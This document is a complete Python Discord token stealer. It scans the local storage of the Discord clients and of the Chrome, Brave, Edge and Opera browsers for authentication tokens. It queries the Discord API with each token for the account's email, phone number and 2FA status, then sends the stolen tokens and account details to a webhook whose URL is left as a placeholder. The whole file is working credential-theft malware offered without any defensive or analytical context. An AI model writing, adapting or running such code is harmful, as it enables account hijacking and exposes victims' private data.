import re
import os
import base64
import typing
import json
import urllib.request


TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}
WEBHOOK_URL = "Webhook"


APP_PATHS = {
    "Discord": "%AppData%\\Discord\\Local Storage\\leveldb",
    "Discord Canary": "%AppData%\\discordcanary\\Local Storage\\leveldb",
    "Discord PTB": "%AppData%\\discordptb\\Local Storage\\leveldb",
    "Chrome": "%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    "Brave": "%LocalAppData%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
    "Edge": "%LocalAppData%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    "Opera": "%AppData%\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
}


def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
    request = urllib.request.Request(
        api_url, data=json.dumps(data).encode(),
        headers=REQUEST_HEADERS
    )

    with urllib.request.urlopen(request) as response:
        response_status = response.status

    return response_status


def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
        try:
            file_contents = text_file.read()
        except PermissionError:
            return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens if tokens else None


def get_user_id_from_token(token: str) -> typing.Union[None, str]:
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_discord_user_info(token: str) -> typing.Union[dict, None]:
    """Fetch user information from Discord API using the token"""
    try:
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        request = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers=headers
        )
        
        with urllib.request.urlopen(request) as response:
            if response.status == 200:
                return json.loads(response.read().decode())
    except:
        pass
    return None


def get_tokens_from_path(base_path: str, app_name: str) -> typing.Dict[str, dict]:
    if not os.path.exists(base_path):
        return None

    file_paths = [
        os.path.join(base_path, filename) for filename in os.listdir(base_path)
        if os.path.isfile(os.path.join(base_path, filename))
    ]

    id_to_tokens: typing.Dict[str, dict] = dict()

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = {
                    "tokens": set(),
                    "sources": set(),
                    "info": None
                }

            id_to_tokens[discord_user_id]["tokens"].add(potential_token)
            id_to_tokens[discord_user_id]["sources"].add(app_name)
            
            
            if id_to_tokens[discord_user_id]["info"] is None:
                user_info = get_discord_user_info(potential_token)
                if user_info:
                    id_to_tokens[discord_user_id]["info"] = user_info

    return id_to_tokens if id_to_tokens else None


def send_tokens_to_webhook(
    webhook_url: str, all_tokens: typing.Dict[str, dict]
) -> int:
    fields: list[dict] = list()

    for user_id, token_data in all_tokens.items():
        token_list = "\n".join([
            f"{token} (from: {', '.join(token_data['sources'])})"
            for token in token_data["tokens"]
        ])
        
        
        account_info = "No additional account information available"
        if token_data["info"]:
            user = token_data["info"]
            account_info = (
                f"Username: {user.get('username', 'N/A')}#{user.get('discriminator', 'N/A')}\n"
                f"Email: {user.get('email', 'N/A')}\n"
                f"Phone: {user.get('phone', 'N/A')}\n"
                f"2FA Enabled: {user.get('mfa_enabled', False)}\n"
                f"Verified: {user.get('verified', False)}\n"
                f"Nitro: {user.get('premium_type', 0) > 0}"
            )
        
        fields.extend([
            {
                "name": f"User ID: {user_id}",
                "value": token_list,
                "inline": False
            },
            {
                "name": "Account Information",
                "value": account_info,
                "inline": False
            },
            {
                "name": "\u200b",  
                "value": "\u200b",
                "inline": False
            }
        ])

    data = {
        "content": "Found Discord tokens",
        "embeds": [{
            "title": "Discovered Tokens",
            "description": "Below are the Discord tokens found on the system:",
            "fields": fields,
            "color": 0xff0000
        }]
    }

    return make_post_request(webhook_url, data)


def main() -> None:
    all_tokens: typing.Dict[str, dict] = {}

    for app_name, path_template in APP_PATHS.items():
        expanded_path = os.path.expandvars(path_template)
        tokens = get_tokens_from_path(expanded_path, app_name)

        if tokens is None:
            continue

        
        for user_id, token_data in tokens.items():
            if user_id not in all_tokens:
                all_tokens[user_id] = {
                    "tokens": set(),
                    "sources": set(),
                    "info": None
                }
            all_tokens[user_id]["tokens"].update(token_data["tokens"])
            all_tokens[user_id]["sources"].update(token_data["sources"])
            
            if token_data["info"] and not all_tokens[user_id]["info"]:
                all_tokens[user_id]["info"] = token_data["info"]

    if not all_tokens:
        print("No Discord tokens found in any of the checked locations.")
        return

    send_tokens_to_webhook(WEBHOOK_URL, all_tokens)


if __name__ == "__main__":
    main()